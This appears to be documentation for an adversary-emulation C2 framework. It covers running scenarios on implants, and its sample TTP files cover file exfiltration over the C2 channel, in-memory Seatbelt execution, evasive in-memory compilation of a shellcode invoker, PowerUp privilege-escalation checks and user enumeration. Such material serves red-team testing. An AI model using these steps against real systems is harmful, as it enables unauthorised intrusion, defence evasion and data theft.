# Scenario Management
A scenario can run with a command below, a valid implant ID and a scenario file given. The scenarios are constructed on the service side, and sent to the implant to run. The implant runs the scenario transferred and return the report to the service to be managed with the ```scenarios``` command. It's important that the scenarios also include any files or content in the TTPs, so the scenario content to be transferred may be larger due to the file attachments.
```
scenario IMPLANTID scenariofilepath
```
Scenarios are managed with ```scenarios``` command. It lists the scenarios executed if no scenario ID is given. If the scenario ID is given, it summarises the scenario run, also shows the output or export the report to a file with the following commands.
```
scenarios
scenarios SCENARIOID
scenarios SCENARIOID output
scenarios SCENARIOID export reportfilepath
```

# Sample Scenarios and TTPs
The following sample scenario will include the TTPs given as parameter. They're reference names to the files located under the Scenarios/TTPs folder to include. The Mitre Att&ck ID and descriptions are in the TTP files. 
```
{
    "threat_actor":"Demo Threat Actor!",
    "ttps":[
        "T1087.001",
        "T1087.002",
        "T1059.001",
        "T1127.001-v2",
        "Seatbelt",
        "ShellcodeInvoke"
    ]
}
```
The following is the content of the T1041.json TTP file. The instructions section is an array which may be multiple commands to run at the same time. If there is other implementations, not similar commands, the best is using another TTP file such as T1041-v2.json to avoid confusions. While downloading a file is not confusing; if the Mitre Att&ck ID has various implementations, the versions would be harder to manage.
```
{
    "name": "Data exfiltration through the C2 channel.",
    "mitreid": "T1041",
    "description": "File download for exfiltration demo using the C2 channel",
    "instructions": [
        "download c:\\windows\\system32\\ftp.exe"
    ]
}
```
The following TTP is a sample to run .NET Assemblies such as Seatbelt with parameters. If it's not necessary to wait for the .NET Assembly to finish due to long time operations, it's better to use execthread-sharpassembly. 
```
{
    "name": "Situational awareness using Seatbelt",
    "mitreid": "Seatbelt",
    "description": "Collecting the user and system information using Seatbelt.",
    "instructions": [
        "exec-sharpassembly file Scenarios/Files/Seatbelt.exe BasicOSInfo"
    ]
}
```
This TTP is used to compile a .NET source in memory. As the file is also transferred through the C2 encrypted channel, and the code will be compiled with the COM compiler without a file, it's quite evasive for code execution. 
```
{
    "name": "Compiling .NET Source Code using .NET COM Compiler",
    "mitreid": "T1127.001",
    "description": "Compiling .NET Source Code using .NET COM Compiler for code execution and defence evasion.",
    "instructions": [
        "exec-sharpcode file Scenarios/Files/ShellcodeInvoke.cs demo"
    ]
}
```
This sample is for the PowerShell scripts to run through the .NET System Automation
```
{
    "name": "PowerUp - Invoke Checks (System Management Automation)",
    "mitreid": "T1059.001",
    "description": "Collecting all potential privilege escalation issues using PowerUp.ps1.",
    "instructions": [
        "exec-powershellautomation file Scenarios/Files/PowerUp.ps1 Invoke-AllChecks"
    ]
}
```
While the other commands may need further knowledge, the following easy sample would be used for easy TTP simulations. For example; adding some known Windows/Linux/Mac commands such as make directory, get ip and network configurations, and get process list as instructions for easy TTP gneration. 
```
{
    "name": "Enumerate users and groups",
    "mitreid": "T1087.001",
    "description": "Getting the users and groups via net command.",
    "instructions": [
        "exec cmd /cnet users",
        "exec cmd /cnet groups"
    ]
}
```

